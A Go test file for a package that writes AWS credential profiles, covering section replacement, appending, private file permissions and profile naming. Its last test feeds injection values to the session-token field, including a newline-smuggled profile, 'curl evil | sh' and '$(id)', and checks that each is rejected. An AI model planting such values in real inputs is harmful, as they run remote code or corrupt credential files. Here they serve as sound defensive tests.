package awsfiles

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

var creds = Credentials{
	AccessKeyID:     "ASIANEW",
	SecretAccessKey: "secret-new",
	SessionToken:    "token-new",
	Expiration:      time.Date(2026, 9, 26, 21, 55, 0, 0, time.UTC),
}

func TestUpsertIntoEmptyFile(t *testing.T) {
	got := upsert("", "default", creds)
	if !strings.HasPrefix(got, "[default]\n") {
		t.Fatalf("unexpected output:\n%s", got)
	}
	if !strings.Contains(got, "aws_session_token = token-new\n") {
		t.Errorf("token missing:\n%s", got)
	}
}

func TestUpsertReplacesOnlyTargetSection(t *testing.T) {
	const before = `# my notes
[personal]
aws_access_key_id = AKIAPERSONAL
aws_secret_access_key = keep-me

[default]
aws_access_key_id = ASIAOLD
aws_secret_access_key = secret-old
aws_session_token = token-old

[other]
aws_access_key_id = AKIAOTHER
`
	got := upsert(before, "default", creds)

	for _, keep := range []string{"# my notes", "[personal]", "keep-me", "[other]", "AKIAOTHER"} {
		if !strings.Contains(got, keep) {
			t.Errorf("lost %q:\n%s", keep, got)
		}
	}
	for _, gone := range []string{"ASIAOLD", "secret-old", "token-old"} {
		if strings.Contains(got, gone) {
			t.Errorf("old value %q still present:\n%s", gone, got)
		}
	}
	if strings.Count(got, "[default]") != 1 {
		t.Errorf("expected exactly one [default]:\n%s", got)
	}
	if !strings.Contains(got, "aws_session_token = token-new\n\n[other]") {
		t.Errorf("section separation not preserved:\n%s", got)
	}
}

func TestUpsertAppendsNewSection(t *testing.T) {
	got := upsert("[personal]\naws_access_key_id = AKIA\n", "platform-dev.Developer", creds)
	if !strings.Contains(got, "[personal]\naws_access_key_id = AKIA\n\n[platform-dev.Developer]\n") {
		t.Errorf("unexpected output:\n%s", got)
	}
}

func TestUpsertProfileWritesPrivateFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "aws", "credentials")
	if err := UpsertProfile(path, "default", creds); err != nil {
		t.Fatal(err)
	}
	info, err := os.Stat(path)
	if err != nil {
		t.Fatal(err)
	}
	// Windows has no Unix permission bits.
	if perm := info.Mode().Perm(); runtime.GOOS != "windows" && perm != 0o600 {
		t.Errorf("permissions = %o, want 600", perm)
	}
}

func TestProfileName(t *testing.T) {
	if got := ProfileName("platform dev", "Admin/Full"); got != "platform-dev.Admin-Full" {
		t.Errorf("got %q", got)
	}
}

func TestUpsertProfileRejectsInjectedValues(t *testing.T) {
	path := filepath.Join(t.TempDir(), "credentials")
	for _, bad := range []string{"tok\n[default]\naws_access_key_id = EVIL", "tok; curl evil | sh", "tok $(id)", ""} {
		c := creds
		c.SessionToken = bad
		if err := UpsertProfile(path, "default", c); err == nil {
			t.Errorf("session token %q should be rejected", bad)
		}
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Error("nothing should be written for invalid credentials")
	}
	c := creds
	c.SessionToken = "IQoJb3JpZ2luX2VjE+/abc=="
	if err := UpsertProfile(path, "default", c); err != nil {
		t.Errorf("base64 session token rejected: %v", err)
	}
}
